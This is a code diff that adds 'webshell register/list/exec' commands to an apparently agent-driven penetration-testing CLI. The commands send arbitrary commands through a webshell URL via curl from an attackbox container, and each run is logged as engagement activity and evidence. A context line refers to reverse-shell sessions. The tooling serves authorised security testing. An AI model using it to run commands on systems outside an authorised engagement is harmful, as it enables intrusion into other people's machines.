@@ -1121,6 +1121,98 @@ tmux
     });
   });
 
+// --- webshell (registered webshell sessions) ---------------------------------
+const ws = program.command("webshell").description("Manage webshell sessions (auto-logged)");
+
+ws.command("register")
+  .description("Register a webshell URL for the active engagement")
+  .argument("<url>", "webshell URL, e.g. http://target/shell.php")
+  .option("--name <name>", "short name for this webshell")
+  .option("--param <param>", "query/post parameter name for commands", "cmd")
+  .option("--engagement <id>")
+  .action(async (url: string, o) => {
+    const eid = await resolveEngagementId(o.engagement);
+    out(await repo.registerWebshell(eid, { name: o.name ?? "", url, param: o.param }));
+  });
+
+ws.command("list")
+  .description("List registered webshells for the active engagement")
+  .option("--engagement <id>")
+  .action(async (o) => out(await repo.listWebshells(await resolveEngagementId(o.engagement))));
+
+ws.command("exec")
+  .description("Execute a command via a registered webshell (auto-logged)")
+  .argument("<shell>", "webshell name or URL")
+  .argument("<command...>", "command to execute on target")
+  .option("--method <method>", "HTTP method: GET or POST", "POST")
+  .option("--max-output <bytes>", "max bytes returned to caller", parseInt, 4096)
+  .option("--engagement <id>")
+  .action(async (shellName: string, command: string[], o) => {
+    const eid = await resolveEngagementId(o.engagement);
+    const shell = await repo.getWebshell(eid, shellName) as { name: string; url: string; param: string } | null;
+    if (!shell) throw new Error(`No webshell "${shellName}". Run: pk webshell register <url> --name ${shellName}`);
+
+    const cmdStr = command.join(" ");
+    const start = Date.now();
+    const container = config.attackbox.container;
+
+    const { execFile: exec } = await import("node:child_process");
+    const curlArgs = o.method === "GET"
+      ? ["curl", "-s", `${shell.url}?${shell.param}=${encodeURIComponent(cmdStr)}`]
+      : ["curl", "-s", shell.url, "--data-urlencode", `${shell.param}=${cmdStr}`];
+
+    const result = await new Promise<{ stdout: string; stderr: string; code: number }>((resolve) => {
+      exec(
+        "docker",
+        ["exec", "-e", "PK_EXEC=1", container, ...curlArgs],
+        { maxBuffer: 10 * 1024 * 1024, timeout: 300000 },
+        (err, stdout, stderr) => {
+          resolve({
+            stdout: stdout ?? "",
+            stderr: stderr ?? "",
+            code: err && "code" in err ? (err.code as number) : err ? 1 : 0,
+          });
+        },
+      );
+    });
+
+    const duration = Date.now() - start;
+    const eng = await repo.getEngagement(eid) as { phase?: string } | null;
+    const phase_ = eng?.phase ?? "exploit";
+
+    await repo.logActivity({
+      engagementId: eid,
+      phase: phase_,
+      action: `[webshell:${shell.name}] ${cmdStr} (${duration}ms, exit ${result.code})`,
+      command: `pk webshell exec ${shell.name} ${cmdStr}`,
+      actor: "agent",
+    });
+
+    await repo.recordExecOutcome(eid, `webshell:${shell.name} ${cmdStr}`, shell.url, result.code).catch(() => {});
+
+    const fullOutput = result.stdout + result.stderr;
+    const maxBytes = o.maxOutput;
+
+    if (fullOutput.length > maxBytes) {
+      const { mkdirSync, writeFileSync } = await import("node:fs");
+      const engRow = await getEngagement(eid);
+      const slug = engRow?.slug ?? eid;
+      const dir = `engagements/${slug}/webshell`;
+      mkdirSync(dir, { recursive: true });
+      const ts = new Date().toISOString().replace(/[:.]/g, "-");
+      const outPath = `${dir}/${shell.name}-${ts}.txt`;
+      writeFileSync(outPath, fullOutput);
+      await addEvidence({ engagementId: eid, path: outPath, type: "output" });
+
+      process.stdout.write(fullOutput.slice(0, maxBytes));
+      process.stderr.write(`\n[truncated: ${fullOutput.length} bytes total, full output at ${outPath}]\n`);
+    } else {
+      if (result.stdout) process.stdout.write(result.stdout);
+      if (result.stderr) process.stderr.write(result.stderr);
+    }
+    process.exitCode = result.code;
+  });
+
 // --- gleipnir (reverse shell sessions) --------------------------------------
 
 const GLEIPNIR_SOCK = process.env.PK_GLEIPNIR_SOCK ?? "/tmp/gleipnir.sock";
